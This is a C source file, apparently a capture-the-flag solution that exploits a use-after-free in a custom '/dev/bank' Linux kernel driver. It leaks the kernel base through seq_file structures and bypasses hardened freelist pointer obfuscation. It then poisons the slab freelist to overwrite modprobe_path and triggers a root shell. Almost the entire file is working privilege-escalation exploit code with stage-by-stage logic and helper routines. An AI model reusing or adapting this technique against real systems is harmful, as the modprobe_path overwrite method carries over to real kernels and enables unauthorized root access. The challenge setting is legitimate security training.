#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>

// commands
#define DEV_PATH "/dev/bank"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

#define MSG_COPY        040000

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}


static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
   ; system("echo '#!/bin/sh' > /home/user/hax; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/root");
    system("chmod +x /home/user/root");
    system("/home/user/root");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

#define BANK_CREATE    0x1337
#define BANK_VIEW      0x1338
#define BANK_EDIT      0x1339
#define BANK_DELETE    0x133a
#define BANK_TRANSFER  0x133b

#define MAX_SZ 108

typedef struct {
    unsigned idx;
    unsigned idx2;
    unsigned amount;
    int *balance;
    char* name;
    size_t len;
} req_t;

typedef struct {
    char* buf;
    size_t sz;
    size_t from;
    size_t count;
    size_t pad_until;
    int64_t index;
    int64_t read_pos;
    int owner; // mutex struct
    int wait_lock; // mutex struct
    void* next; // mutex struct
    void* prev; // mutex struct
    void* op;
    int poll_event;
    void* file;
    void* private;
} seq_file_t;

static void create(int fd)
{
    req_t req = {0};

    if (ioctl(fd, BANK_CREATE, &req) < 0) {
       errExit("BANK_CREATE");
    }
}

void edit(int fd, unsigned idx, char* name, size_t len)
{
    req_t req = {0};
    req.idx = idx;
    req.name = name;
    req.len = len;

    if (ioctl(fd, BANK_EDIT, &req) < 0) {
        errExit("BANK_EDIT");
    }
}

static void view(int fd, unsigned idx, char* name, int* balance)
{
    req_t req = {0};
    req.idx = idx;
    req.balance = balance;
    req.name = name;

    if (ioctl(fd, BANK_VIEW, &req) < 0) {
        errExit("BANK_EDIT");
    }
}

static void transfer(int fd, unsigned from, unsigned to, unsigned amount)
{
    req_t req = {0};
    req.idx = from;
    req.idx2 = to;
    req.amount = amount;

    if (ioctl(fd, BANK_TRANSFER, &req) < 0) {
        errExit("BANK_TRANSFER");
    }
}

static void delete(int fd, unsigned idx)
{
    req_t req = {0};
    req.idx = idx;

    if (ioctl(fd, BANK_DELETE, &req) < 0) {
        errExit("BANK_DELETE");
    }
}

bool is_kernel_ptr(uint64_t val)
{

    return (val & 0xffffffff00000000) == 0xffffffff00000000;
}

uint64_t find_kernel_base(uint64_t* buf, size_t len)
{
    // search for a seq_operations ?
    for (size_t i = 0; i < len - 0x4; i++) {
        if (is_kernel_ptr(buf[i]) && is_kernel_ptr(buf[i+1])
            && is_kernel_ptr(buf[i+2]) && is_kernel_ptr(buf[i+3])) {
            return buf[i] - 0x811900;
        }
    }

    return 0;
}

int main(void) 
{
    int ret;
    int fd = open(DEV_PATH, O_RDONLY);
    int fd2 = open(DEV_PATH, O_RDONLY);

    system("id");

    puts("**** Stage 1: Leak kernel base ****\n");

    if (fd < 0 || fd2 < 0) {
        errExit("open dev");
    }

    char buf[MAX_SZ + 4] = {0};
    int balance;

    for (int i = 0; i < 0x3; i++) {
        create(fd);
    }

    memset(buf, 0x00, sizeof(buf));

    ret = close(fd2);

    if (ret < 0) {
        errExit("close");
    }

    int fd_seq = open("/proc/self/stat", O_RDONLY);
    int fd_seq2 = open("/proc/self/stat", O_RDONLY);

    if (fd_seq < 0 || fd_seq2 < 0) {
        errExit("open fd_seq");
    }

    char buf2[0x100000] = {0};

    read(fd_seq, buf, 0x40);

    view(fd, 0x2, buf, &balance);
    print_hex8(buf + 4, MAX_SZ);

    uint64_t *p_buf = (uint64_t *)(buf - 4);
    seq_file_t* file = (seq_file_t*)(buf - 4);
    file->from = 0;
    file->count = 0x10000;
    edit(fd, 0x2, buf, MAX_SZ);

    read(fd_seq, buf2, 0x10000);
    
    uint64_t k_base = find_kernel_base((uint64_t *)buf2, 0x10000 / 0x8);
    uint64_t modprobe = k_base + 0xa3c3a0;

    if (!k_base) {
        puts("failed to leak kbase");
        return -1;
    }

    printf("Kernel base: %p \n", k_base);
    printf("Modeprobe path: %p \n", modprobe);

    puts("\n**** Stage 2: Leak secret ****\n");

    close(fd_seq);
    close(fd_seq2);

    // 2 == fd_seq
    view(fd, 0x2, buf, &balance);
    p_buf = (uint64_t *)(buf - 4);
    
    uint64_t seq_addr = (uint64_t)file->next - 0x40;

    printf("Chunk2 info: %p \n", seq_addr);

    // 1 == fd_seq2
    view(fd, 0x1, buf, &balance);

    uint64_t seq2_addr = (uint64_t)file->next - 0x40;
    uint64_t seq2_fd_ptr = p_buf[0x7];
    uint64_t seq2_fd_ptr_addr = seq2_addr + (0x7 * 0x8);

    printf("Chunk1 info: %p %p %p \n", seq2_addr, seq2_fd_ptr,
                                      seq2_fd_ptr_addr);

    uint64_t random_val = seq_addr ^ bswap(seq2_fd_ptr_addr) ^
                          seq2_fd_ptr;

    uint64_t check = seq_addr ^ random_val ^ bswap(seq2_fd_ptr_addr);

    printf("random val: %p %p==%p \n", random_val, seq2_fd_ptr, check);

    puts("**** Stage 3: Overwriting modprobe ****\n");

    uint64_t obfus_modprobe = (modprobe-0x4) ^ random_val ^ bswap(seq2_fd_ptr_addr);

    p_buf[0x7] = obfus_modprobe;
    edit(fd, 0x1, buf, MAX_SZ);

    create(fd); // 3 - was 1
    create(fd); // 4 - was 2

    char path[0x10] = {0};
    strcpy(path, "/home/user/hax\x00");
    edit(fd, 0x4, path, sizeof(path));

    puts("\n**** Stage 4: Fixing freelist ****\n");
    /*
     * 1 -> 2 -> x
     * 1 -> modprobe_path -> corrupt
     * corrupt
     * 1 -> corrupt
     * 1 -> 2 -> x (fix freelist by restoring 1->fd)
     */
    delete(fd, 3);
    p_buf[0x7] = seq2_fd_ptr;
    edit(fd, 0x1, buf, MAX_SZ);

    puts("\n**** Stage 5: Triggering shell ****\n");

    shell_modprobe();

    WAIT();
    return 0;
}

